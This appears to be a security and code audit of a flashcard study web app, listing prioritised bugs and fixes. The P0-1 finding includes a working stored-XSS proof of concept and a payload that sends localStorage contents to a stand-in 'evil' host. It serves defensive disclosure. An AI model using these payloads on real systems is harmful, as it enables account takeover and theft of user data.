## P0 — Fix this week

### P0-1. Stored XSS via a public deck's document ID (account takeover)

**`src/main.ts:4083`**

```ts
<button onclick="importPublicDeckById('${_e(d.id)}')" ...>
```

`_e` is HTML-escaping, but this is a **JavaScript string context inside an HTML
attribute**. The HTML parser decodes entities *before* the JS is compiled, so `'` →
`&#39;` → `'` again. Proven:

```
input id:  x');alert(document.domain);//
rendered:  <button onclick="importPublicDeckById('x&#39;);alert(document.domain);//')">
executes:  importPublicDeckById('x');alert(document.domain);//')
```

**Reachable in production.** `firestore.rules:41` lets any signed-in user `create`
`publicDecks/{deckId}` with a **client-chosen document ID**, and Firestore document IDs
permit quotes, parens and semicolons (only `/`, `.`, `..` and `__*__` are barred). So:

1. Attacker signs up (free) and writes `publicDecks/x');fetch('https://evil/'+localStorage.brainfyState);//`
   with a plausible name and ≥1 card.
2. Any user who opens **Library → Community** executes it (`renderCommunity`,
   `src/main.ts:4072-4087`).
3. CSP is no help: `script-src` includes `'unsafe-inline'` (`_headers`), and
   `img-src 'self' data: https:` allows exfiltration to any HTTPS host. The payload can
   read `localStorage` (full study state) and the Firebase ID token from IndexedDB.

This is the only such sink in the codebase — every other inline handler interpolates a
number or a hard-coded constant (verified by sweeping all 56 `onclick=` sites).

**Fix** — validate the id against the same regex the SSR route already uses
(`functions/decks/[id].js:26`), and stop putting data in an attribute:

```ts
const DECK_ID_RE = /^[A-Za-z0-9_-]{6,64}$/;
// in fetchPublicDecks(): .filter(d => DECK_ID_RE.test(d.id))
// in renderCommunity(): <button class="deck-import" data-deck-id="${_e(d.id)}">
grid.addEventListener('click', e => {
  const b = (e.target as HTMLElement).closest<HTMLElement>('.deck-import');
  if (b?.dataset.deckId) importPublicDeckById(b.dataset.deckId);
});
```

Also tighten `firestore.rules` so IDs are constrained server-side. Then audit existing
`publicDecks` IDs (currently only the 10 seeded ones, so the window is still clean).

### P0-2. Returning users are pinned to a 3-month-old JavaScript bundle

`index.html:4217` — `var APP_VERSION = '1779256800';` (2026-05-20). The bundle is loaded as
`/script.js?v=' + APP_VERSION` (`index.html:4260`), and production serves it with
(verified by `curl -D-`):

```
cache-control: public, max-age=31536000, immutable
```

`APP_VERSION` has not been bumped since commit `4d04874`. **14 commits have changed
`script.js` since then:**

```
63c040a share & referral loop     3700ae3 freemium scaffold      184f62f accessibility pass
a575802 splash returning-user     767d4bc public/shared decks    4af30c3 guest mode + cloud merge
57270d5 SSR deck pages            2c59f59 focus-aware coach      74f1159 audit quick wins
8df9a2f mobile polish             960a9a7 streak freeze          a1457d0 home onboarding
724b204 multi-mode study          2161d4a import/export
```

`index.html` is `no-store`, so every visitor gets fresh HTML — which then requests the
**same versioned URL they already hold in an immutable 1-year cache**, so the browser never
revalidates. Anyone who loaded Brainfy between 2026-05-27 and today is still running the
May-27 bundle: no guest mode fix, no data-loss fix, no accessibility pass, no study modes,
no sharing. `sw.js`'s stale-while-revalidate compounds it (its own `fetch()` can be served
from that same HTTP cache).

Same bug, second instance: `index.html:132` loads `/icons.js?v=1778429000` — that stamp was
set on 2026-05-23 and `icons.js` was modified twice on 2026-05-27 (`4d04874`, `f26743d` —
which *added an icon*). Also `immutable` for a year.

**Fix** — stop hand-maintaining the stamp. Derive it in the build and fail CI if it drifts:

```json
"build": "npm run tsc && npm run minify && node scripts/stamp-version.mjs"
```

where `stamp-version.mjs` rewrites `APP_VERSION` and the `icons.js?v=` query with a hash of
`script.js` + `icons.js`. One-time recovery: bump both stamps now and deploy.

### P0-3. Turning off reminders or unsharing a deck breaks cloud sync for the session

Two places assign `undefined` into the synced state object:

- `src/main.ts:2891` — `S.pushSub = undefined;` in `disableReminders()`
- `src/main.ts:3895` — `s.publicDeckId = undefined;` in `unpublishDeck()`

Both are immediately followed by `save()`, which does `ref.set({ state: S, ... })`
(`src/main.ts:1288`). The Firestore Web SDK **rejects `undefined` field values** —
`Unsupported field value: undefined` — and there is no
`firestore().settings({ ignoreUndefinedProperties: true })` anywhere (verified by grep).
The SDK raises this during argument validation, i.e. *before* the promise exists, so the
`.catch()` on line 1290 does not run: the exception escapes the `setTimeout` callback, the
sync chip stays on **"Syncing…" forever**, `track('sync.save.error')` never fires, and every
later `save()` fails the same way until the page is reloaded. Local storage is fine (it's
written first and `JSON.stringify` drops `undefined`), so the user loses nothing on that
device — but nothing syncs, and they are told everything is fine.

**Fix** — three lines, all worth doing:

```ts
delete S.pushSub;              // instead of = undefined
delete s.publicDeckId;         // instead of = undefined
```
plus `try { ref.set(...) } catch (e) { setSyncState('error'); track('sync.save.throw', …) }`
in `save()`, so a future value of this shape degrades loudly instead of silently.

### P0-4. One CDN failure silently bricks the whole app, with no error and no retry

`index.html:4246-4262`:

```js
appPromise = Promise.all([ 4× loadScript(gstatic firebase-*-compat.js) ])
  .then(function () { firebase.initializeApp(FB_CONFIG); })
  .then(function () { return loadScript('/script.js?v=' + APP_VERSION); });
```

No `.catch()`, and `appPromise` is memoized. If **any** of the four gstatic scripts fails to
load, `/script.js` never loads, every stubbed CTA (`goTo`, `enterGuestMode`, `openSearch`,
`startTour` — `index.html:4286-4293`) becomes a no-op, clicking again re-uses the rejected
promise, and the user sees a splash page where nothing happens. No message, no fallback.

**I reproduced exactly this.** Loading production in a browser where `gstatic.com` was
unreachable: `"Try it free — no signup"` did nothing, console showed
`Uncaught (in promise) … target: script`, and `performance.getEntriesByType('resource')`
showed all four Firebase SDKs at `transferSize: 0`. (In my case the block was my sandbox —
gstatic is reachable from the network generally, `curl` returns 200 — but the same happens
for any user behind a corporate proxy, a privacy extension, a region that blocks gstatic,
or a gstatic incident.)

The sharpest part: **guest mode needs no Firebase at all**, yet it is gated behind four
Firebase SDK downloads.

**Fix**:

```js
appPromise = Promise.all([...]).then(...).then(...)
  .catch(function (e) {
    appPromise = null;                                  // let a retry actually retry
    return loadScript('/script.js?v=' + APP_VERSION)    // guest mode works without Firebase
      .catch(function () { showBootError(); });         // …and if that fails, say so
  });
```

Plus `<link rel="preconnect" href="https://www.gstatic.com">` in `<head>` to shave the
handshake off the happy path.

## P1 — High value

### P1-1. A failed cloud read can wipe the account; unsynced local edits are silently discarded

`resolveStateAfterAuth`, `src/main.ts:1425-1461`. Two distinct data-loss paths:

**(a) Read fails → local overwrites cloud.** If `ref.get()` throws (line 1431 — transient
Firestore error, extension blocking `firestore.googleapis.com`, rules hiccup), `cloudState`
stays `null` → `cloudHasData` is `false` → the `else` branch keeps local state → **line 1461
calls `save()`, pushing it over the real cloud document.** On a fresh device, local is
`DEFAULT_STATE`, so the user's entire account is replaced with an empty state. `save()`
does guard `navigator.onLine === false`, so a hard offline is safe — but "online with a
failing read" is exactly the case that isn't. The comment on line 1434 ("keep local; chip
surfaces the error on next save") describes the intent; line 1461 contradicts it.

**(b) Cloud wins even when it is older.** `save()` debounces cloud writes by 400 ms
(line 1287) and there is no `beforeunload`/`pagehide` flush (verified by grep). Close the
tab within 400 ms of an edit — or lose connectivity — and the write never lands. On the next
session, line 1446 takes `cloudHasData` → `S = cloudState`, discarding the newer local
state. The cloud doc *stores* `updatedAt` (line 1288) but nothing ever reads it.

**Fix** — track read success and compare timestamps:

```ts
let cloudReadOk = false;
try { …; cloudReadOk = true; } catch { cloudReadOk = false; }
if (!cloudReadOk) { setSyncState('error'); return; }   // never write over an unread doc
// and when both sides have data, use the merge path you already have:
if (localUpdatedAt > cloudUpdatedAt) S = mergeStates(cloudState, localState);
```

`mergeStates()` (line 1353) is already written and correct — it just isn't used for this case.

### P1-2. Pages Functions get **none** of your security headers

Verified with `curl -D-` against production:

| URL | CSP | X-Frame-Options | HSTS | nosniff |
|---|---|---|---|---|
| `/` (static) | ✅ | ✅ | ✅ | ✅ |
| `/script.js` (static) | ✅ | ✅ | ✅ | ✅ |
| **`/decks` (Function)** | ❌ | ❌ | ❌ | ❌ |

Cloudflare Pages applies `_headers` to static assets only, not to Function responses. So the
pages that render **user-generated content** (`/decks`, `/decks/<id>`) and all of `/api/*`
run with no CSP, no framing protection, and no HSTS. The SSR renderer's escaping is good
(`functions/decks/_render.js:8`, plus the `jsonForScript` guard on the JSON-LD block — that
part is genuinely well done), so there's no live XSS there; this is the missing safety net
under it, and free clickjacking of your deck pages today.

**Fix** — set them in the Functions themselves. A tiny `functions/_middleware.js` that wraps
`await next()` and stamps the same header set covers every Function at once.

### P1-3. Public decks are an unmoderated, self-indexing UGC surface

Any signed-in user can publish up to 1000 cards which are (a) world-readable, (b) rendered
at an indexable `/decks/<id>` (`functions/decks/[id].js`), (c) listed on `/decks`, and
(d) auto-injected into `/decks-sitemap.xml` and submitted to Google via `robots.txt`. There
is no rate limit (Firestore rules can't do one), no report button, no review, and no kill
switch. A spammer with one free account can put thousands of indexable pages on your domain,
with their text as your `<title>` and `<meta description>` — the classic route to a manual
action against the whole site.

Cheapest durable fix: add an `approved: false` field, require `approved == true` in
`index.js` / `decks-sitemap.xml.js` / the `robots` meta, and flip it yourself (or after
N imports). It costs you nothing at 10 decks and saves the domain at 10,000.

Related, smaller:
- `firestore.rules:50` validates `name` size on **create** but not on **update** — a user
  can publish a valid deck then rename it to 1 MB of text, which becomes the page `<title>`.
- `color` is unvalidated in the rules and interpolated straight into a `style` attribute at
  `src/main.ts:4075-4076` → CSS injection (overlay/UI-spoofing, plus a `background-image:
  url()` beacon that CSP permits). The SSR renderer already validates it
  (`_render.js:29`); the client should use the same `/^#[0-9a-fA-F]{6}$/` test.
- `unpublishDeck()` deletes the doc but the SSR page is edge-cached `s-maxage=3600` and stays
  in Google's index — "stop sharing" isn't immediate. Worth saying so in the UI.

### P1-4. Publishing a deck is one tap, publishes the user's real name, and isn't in the privacy policy

`toggleShareDeck()` → `publishDeck()` (`src/main.ts:3846`) fires on a single tap with no
confirmation. It writes `ownerName` from the user's Google display name (line 3855) into a
world-readable document that is rendered on a public page and submitted to search engines
("shared by *Real Name*", `_render.js`). Decks are built from the user's own notes and PDFs.
For an app aimed at GCSE/A-level/AP students, one tap between "my notes" and "my full name
on an indexed page" is too few.

`privacy.html` (last updated 2026-05-09) doesn't mention public sharing at all. Also missing
or stale there:

- **IP address + user agent + country are logged** on every client error
  (`functions/api/log.js:60-62` reads `cf-connecting-ip`), while §1 describes usage data as
  "collected anonymously".
- **Cloudflare** isn't listed as a processor in §5 (it's your host and your log sink).
- **Push subscription** endpoints are stored in the user's doc (`src/main.ts:2859`).
- §6 says to delete your account by emailing you — the app has had a self-serve delete flow
  since `src/main.ts:5333`. The policy understates the user's control.

**Fix**: a confirm dialog naming exactly what goes public (deck contents + display name +
"may appear in Google"), an editable/anonymisable publish name, and a 20-minute policy refresh.

### P1-5. The invite link publishes the user's Firebase UID

`src/main.ts:3976` — `?ref=${firebaseUser.uid}`, shared to WhatsApp/X/Reddit. That UID is
also the `ownerUid` on every public deck (world-readable). Anyone can therefore link a
public post to that person's deck library, and it hands out a stable internal identifier for
free. Use a random per-user referral code stored on the user doc instead.

### P1-6. Cloudflare Web Analytics is blocked by your own CSP — you have no traffic data

Live console on `brainfy.online`:

```
Loading the script 'https://static.cloudflareinsights.com/beacon.min.js/…' violates
the following Content Security Policy directive: "script-src 'self' 'unsafe-inline' …"
```

The beacon is injected by Cloudflare but `script-src` doesn't allow it, so it never runs.
For a solo founder running an SEO push across 58 landing pages, flying blind on traffic is
expensive. Add `https://static.cloudflareinsights.com` to `script-src` (and
`connect-src`), or turn the feature off so it stops throwing.

### P1-7. AI cost controls have real gaps

The auth gate (`functions/api/_lib/auth.js`) is solid — full RS256 JWKS verification with a
forged-signature test. The spend controls around it are thinner than they look:

- **`tooLarge()` only reads `Content-Length`** (`guard.js:17`). A chunked request has no
  such header, so `if (len && …)` short-circuits and the cap is skipped entirely.
- **No length cap on `content`** in `/api/process-content` — only base64 images are bounded
  (`process-content.js:158`). Cap the text too (e.g. 100k chars) *after* parsing, where it
  can't be bypassed.
- **`rateLimit()` fails open** when `RATE_LIMIT_KV` isn't bound (`guard.js:41`) — please
  confirm in the Pages dashboard that it actually is. Even bound, read-then-write on KV is
  racy and KV is eventually consistent, so a 60 s window is porous across colos. A
  Cloudflare **Rate Limiting rule on `/api/*`** is the durable backstop.
- **`/api/youtube` has no rate limit at all** and fetches a full YouTube watch page (~1 MB)
  per call.
- **`/api/chat` forwards a client-supplied `system` prompt and message list.** Anyone with a
  free Brainfy account has a general-purpose LLM API on your Groq key. Keep the system
  prompts server-side, keyed by a `mode` enum from the client.
- **`/api/log` is unauthenticated** and writes an attacker-controlled line per request.

### P1-8. Two bugs in the SRS engine — the thing the whole product rests on

- **Interval scheduling uses exact timestamps, not day boundaries** (`src/main.ts:446`):
  `dueAt = now + interval * DAY_MS`. Rate a card "good" (3 d) at 21:00 and it isn't due
  until 21:00 three days later — a user studying at 19:30 that day sees "nothing due", then
  gets a double batch the next day. Anki schedules to the day rollover for exactly this
  reason. Fix: anchor to local start-of-day, or treat a card as due when
  `dueAt - now < 4 * 3600_000`.
- **`SRS_EASE_DEFAULT === SRS_EASE_MAX === 2.5`** (`src/main.ts:403-404`), so the `+0.15`
  ease bonus on "Easy" (lines 430, 439) is a no-op for every card that hasn't already been
  penalised. Ease can only ever ratchet **down**. Either raise `SRS_EASE_MAX` to ~3.0 or
  drop the default to ~2.3.
- Minor: rating a *new* card "Again" sets `interval = 0`, which makes it no longer "new"
  (`isNew` is `interval == null`, line 497), so it permanently escapes the
  `SRS_NEW_PER_SESSION` cap. Tap "Again" on 100 fresh imports and next session shows all 100.

## P2 — Worth doing

- **Test coverage is one module deep.** All 18 tests cover `_lib/auth.js`. The two purest,
  highest-risk functions in the app — `srsSchedule()` and `mergeStates()` — have none, and
  both are exactly the shape `node:test` handles well. CI already runs `npm test`; extract
  them and add ~30 lines of tests.
- **`no-store` on `/` costs every repeat visit ~285 KB.** `_headers` sets
  `no-cache, no-store, must-revalidate` on `/` and `/index.html`. `no-cache` alone gives you
  the same freshness guarantee (revalidate every time) while allowing a **304** instead of a
  full re-download. `no-store` forbids even that.
- **Study reminders can't remind.** `VAPID_PUBLIC_KEY = ''` (`src/main.ts:2835`) and there's
  no sender, so `maybeSubscribePush()` returns immediately and the only notification path is
  `nudgeIfDue()` — which fires *when the user opens the app*. The settings copy says "We'll
  nudge you when cards are due" (line 2877). It can't. Either soften the copy or ship a
  scheduled sender (a Cloudflare Cron Trigger + the stored `pushSub` is a half-day of work).
- **Site freshness has drifted.** All 58 URLs in `sitemap.xml` carry an identical
  `lastmod` of `2026-05-31`, and the visible "Last updated 2026-05-31" on every landing page
  is now 11 weeks old, with no commits since. Uniform `lastmod` is a weak signal to Google;
  stale visible dates are a weak signal to readers.
- **`youtube-transcript` is a dependency you don't ship.** It's used only by `server.js:302`
  (local dev); the deployed path is the hand-rolled scraper in `functions/api/youtube.js`.
  Meanwhile `server.js` is a second implementation of `/api/*` with **no auth checks** — fine
  as a local harness, but it will drift from the Functions, and it's a foot-gun if it's ever
  run anywhere public. Consider deleting it in favour of `wrangler pages dev`.
- **`package-lock.json` is gitignored**, so CI runs `npm install` and builds aren't
  reproducible (noted in `build.yml` itself). Commit the lockfile and switch to `npm ci`.
- `src/main.ts` contains 4 literal NUL bytes used as dedup-key separators (lines 1358-1359,
  1383). Harmless at runtime, but it makes `grep`/`rg` treat the file as binary and skip it
  by default — write them as ` ` instead.

## What's excellent — don't regress it

- **JWT verification** (`functions/api/_lib/auth.js`) — full RS256 JWKS signature check plus
  `aud`/`iss`/`exp`/`iat`, cached keys, and a forged-signature test. No shortcuts.
- **Firestore + Storage rules** are correctly owner-scoped with catch-all denies.
- **SSR escaping** (`functions/decks/_render.js`) — including `jsonForScript()` for the
  JSON-LD block, which is the exact bug most hand-rolled SSR gets wrong.
- **Secrets hygiene** — `.env` and `serviceAccountKey.json` gitignored and never committed
  (checked the full history).
- **CI catches bundle drift** (`build.yml` diffs the committed `script.js` against a fresh
  build) — the right instinct; P0-2 is the one gap it doesn't cover.
- **The lazy-load split** — the splash renders from HTML + a 14 KB `icons.js`, with zero JS
  frameworks and no bundle until interaction. Verified live: exactly 2 requests for first paint.
- **The deck SSR → sitemap pipeline works end to end** — `/decks-sitemap.xml` is serving 11
  live URLs right now.
